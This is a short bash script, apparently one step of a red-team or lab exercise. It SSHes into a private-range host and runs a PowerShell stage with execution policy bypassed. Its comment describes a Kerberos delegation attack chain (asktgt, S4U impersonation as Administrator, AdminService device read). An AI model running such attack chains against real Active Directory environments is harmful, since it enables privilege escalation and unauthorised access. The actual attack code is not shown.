#!/bin/bash
# CD stage 1: asktgt + s4u as Administrator + AdminService device read
ssh -i C:\Users\Ganro\.ssh\cadre-ws01-key -o StrictHostKeyChecking=no analyst_t1@192.168.77.62 "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\analyst_t1\ws01-cd-stage1.ps1"
